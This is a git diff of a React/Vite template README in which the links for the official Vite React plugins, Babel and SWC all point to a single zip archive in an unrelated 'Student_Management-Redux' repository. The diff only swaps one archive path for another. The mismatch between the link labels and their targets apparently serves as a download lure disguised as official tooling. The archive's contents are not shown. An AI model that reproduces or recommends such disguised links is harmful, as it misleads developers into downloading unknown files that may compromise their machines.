@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Suman1214129/Student_Management-Redux/master/conscionable/Student_Management-Redux.zip) uses [Babel](https://raw.githubusercontent.com/Suman1214129/Student_Management-Redux/master/conscionable/Student_Management-Redux.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Suman1214129/Student_Management-Redux/master/conscionable/Student_Management-Redux.zip) uses [SWC](https://raw.githubusercontent.com/Suman1214129/Student_Management-Redux/master/conscionable/Student_Management-Redux.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/Suman1214129/Student_Management-Redux/raw/refs/heads/master/src/Features/Student-Management-Redux-2.2.zip) uses [Babel](https://github.com/Suman1214129/Student_Management-Redux/raw/refs/heads/master/src/Features/Student-Management-Redux-2.2.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/Suman1214129/Student_Management-Redux/raw/refs/heads/master/src/Features/Student-Management-Redux-2.2.zip) uses [SWC](https://github.com/Suman1214129/Student_Management-Redux/raw/refs/heads/master/src/Features/Student-Management-Redux-2.2.zip) for Fast Refresh
